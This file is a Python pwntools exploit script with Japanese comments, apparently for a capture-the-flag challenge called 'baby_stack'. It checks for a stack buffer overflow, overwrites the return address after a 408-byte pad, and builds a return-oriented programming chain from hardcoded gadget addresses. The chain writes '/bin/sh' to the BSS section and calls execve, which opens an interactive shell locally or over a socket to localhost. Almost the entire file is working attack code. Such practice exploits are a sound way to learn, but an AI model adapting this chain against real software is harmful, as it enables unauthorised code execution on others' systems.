import os, sys
import argparse
import logging

from pwn import *

def main( args ):
    
    if args.ope is None:
        
        proc = prologue( args.prog )
        
        check_sof( proc )
    
    elif args.ope == "overwrite_ret_adrs":
        
        proc = prologue( args.prog )
        
        val = input()
        print( val )
        
        adrs = b'\x41\x41\x41\x41'
        overwrite_ret_adrs( proc, adrs )
    
    elif args.ope == "exec_syscall":
        
        proc = prologue( args.prog )
        
        val = input()
        print( val )
        
        ropchain = b''
        
        ropchain += p64( 0x4016ea ) # pop rax; ret;
        ropchain += p64( 0x000027 ) # 0x27(39) getpid()
        ropchain += p64( 0x456889 ) # syscall; ret;
        ropchain += p64( 0x41414141 )
        overwrite_ret_adrs( proc, ropchain )
    
    elif args.ope == "shell":
        
        proc = prologue( args.prog )
        
        val = input()
        print( val )
        
        shell( proc )
    
    elif args.ope == "remote_shell":
        
        proc = prologue_remote()
        
        val = input()
        print( val )
        
        shell( proc )
    
    else:
        raise

def prologue( prog ):
    
    # baby_stack起動
    proc = process( ['sh', '-c', prog] )
    
    # "Please tell me your name >> "
    logging.debug( proc.recv(timeout=1) )
    
    ss = b'daisuke'
    logging.debug( ss )
    proc.sendline( ss )
    
    # "Give me your message >> "
    logging.debug( proc.recv(timeout=1) )
    
    return proc

def prologue_remote():
    
    # サーバに接続
    proc = remote( '127.0.0.1', 15285 )
    
    # "Please tell me your name >> "
    logging.debug( proc.recv(timeout=1) )
    
    ss = b'daisuke'
    logging.debug( ss )
    proc.sendline( ss )
    
    # "Give me your message >> "
    logging.debug( proc.recv(timeout=1) )
    
    return proc

def check_sof( proc ):
    
    ss = b'A' * 200
    logging.debug( ss )
    proc.sendline( ss )
    
    # receive error
    logging.debug( proc.recv(timeout=1) )

def overwrite_ret_adrs( proc, adrs ):
    
    ss = b'\x00' * 408 + adrs
    logging.debug( ss )
    proc.sendline( ss )
    
    # receive error
    logging.debug( proc.recv(timeout=1) )

def shell( proc ):
    
    ropchain = b''
    
    adrs_bss = 0x0059f920
    
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += p64( adrs_bss ) # RAX に BSS の開始アドレスを設定 (次の [rax+0x39] が変な場所に書かないようにするため)
    ropchain += p64( 0x470931 ) # pop rdi; or byte [rax+0x39], cl; ret;
    ropchain += p64( adrs_bss ) # RDI(第1引数) に BSS の開始アドレスを設定
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += b'/bin/sh\x00'  # RAX に b'/bin/sh\x00'を設定
    ropchain += p64( 0x456499 ) # mov qword [rdi], rax; ret;
                                # BSS の開始アドレスに b'/bin/sh\x00'を書き込む
    
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += p64( adrs_bss ) # RAX に BSS の開始アドレスを設定 (次の [rax-0x77] が変な場所に書かないようにするため)
    ropchain += p64( 0x46defd ) # pop rsi; ret;
    ropchain += p64( 0 )        # RSI(第2引数) に 0 を設定
    ropchain += p64( 0x4a247c ) # pop rdx; or byte [rax-0x77], cl; ret;
    ropchain += p64( 0 )        # RDX(第3引数) に 0 を設定
    ropchain += p64( 0x4016ea ) # pop rax; ret;
    ropchain += p64( 0x3b )     # RAX(システムコール番号) に 0x3b を設定
    ropchain += p64( 0x456889 ) # syscall; ret;
    overwrite_ret_adrs( proc, ropchain )
    proc.interactive()

def parse_args():
    
    parser = argparse.ArgumentParser( description='baby_stack' )
    
    parser.add_argument( '--ope',   default=None,           help='select operation, [None or ...]' )
    parser.add_argument( '--prog',  default=0,              help='input program path' )
    parser.add_argument( '--debug', action='store_true',    help='debug' )
    
    return parser.parse_args()

if __name__ == '__main__':
    
    args = parse_args()
    print( f"args={args}" )
    
    if args.debug:
        logname = os.path.basename( sys.argv[0] )
        logname = os.path.splitext(logname)[0] + ".log"
        if os.path.isfile( logname ):
            os.remove( logname )
        logging.basicConfig( level=logging.DEBUG, filename=logname )
    else:
        logging.basicConfig( level=logging.INFO )
    
    main( args )
